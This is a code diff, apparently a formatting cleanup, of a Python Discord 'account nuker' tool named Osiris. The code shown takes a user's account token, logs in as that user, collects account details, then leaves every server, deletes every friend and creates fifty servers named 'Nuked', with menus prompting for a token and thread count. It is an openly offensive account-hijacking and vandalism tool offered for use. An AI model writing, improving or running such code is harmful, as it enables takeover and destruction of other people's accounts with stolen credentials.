@@ -16,8 +16,6 @@ The creator of the Jajaja account nuker, @coats1337, has given me full permissio
 """
 
 
-
-
 # Scripted by Catterall/coats1337 (https://github.com/Catterall) (https://github.com/coats1337).
 # Osiris Tool under the GNU General Public Liscense v2 (1991).
 
@@ -40,6 +38,7 @@ init(convert=True)
 user_guilds = []
 user_friends = []
 
+
 def clear():
     os.system('cls')
 
@@ -60,7 +59,7 @@ class Login(discord.Client):
     def run(self, token):
         try:
             super().run(token, bot=False)
-        except:
+        except BaseException:
             print(Fore.RED + "\nInvalid Token.")
             sleep(3)
 
@@ -89,7 +88,7 @@ def login(token):
 # Gather an account's information via a token.
 
 def spy(token):
-    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
     r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
     if r.status_code == 200:
         userName = r.json()['username'] + '#' + r.json()['discriminator']
@@ -116,15 +115,18 @@ def spy(token):
 
 def accountNuke(token):
     headers = {'Authorization': token}
-    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Nuking account. . .")
+    print(
+        f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Nuking account. . .")
 
     for guild in user_guilds:
         requests.delete(
-            f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)
+            f'https://discord.com/api/v6/users/@me/guilds/{guild}',
+            headers=headers)
 
     for friend in user_friends:
         requests.delete(
-            f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
+            f'https://discord.com/api/v6/users/@me/relationships/{friend}',
+            headers=headers)
 
     for i in range(50):
         payload = {'name': f'Nuked #{i}', 'region': 'europe',
@@ -142,7 +144,7 @@ def getBanner():
                                          ██║   ██║███████╗██║██████╔╝██║███████╗
                                          ██║   ██║╚════██║██║██╔══██╗██║╚════██║
                                          ╚██████╔╝███████║██║██║  ██║██║███████║
-                                          ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚═╝╚══════╝'''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}')+f'''
+                                          ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚═╝╚══════╝'''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}') + f'''
 
 
 
@@ -168,8 +170,12 @@ def startMenu():
         if choice == '1':
             token = str(input(
                 f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
-            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
+            headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'}
+            r = requests.get(
+                'https://discord.com/api/v6/users/@me',
+                headers=headers)
             if r.status_code == 200:
                 threads = str(input(
                     f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}No. of threads: {Fore.LIGHTRED_EX}'))
@@ -189,17 +195,21 @@ def startMenu():
         elif choice == '3':
             token = str(input(
                 f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
-            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
+            headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'}
+            r = requests.get(
+                'https://discord.com/api/v6/users/@me',
+                headers=headers)
             if r.status_code == 200:
                 login(token)
             else:
                 print(Fore.RED + "\nInvalid Token.")
-                sleep(3)            
+                sleep(3)
 
         elif choice == '4':
             choice = str(input(
-            f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
+                f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
             if choice.upper() == 'Y':
                 exit(0)
             else:
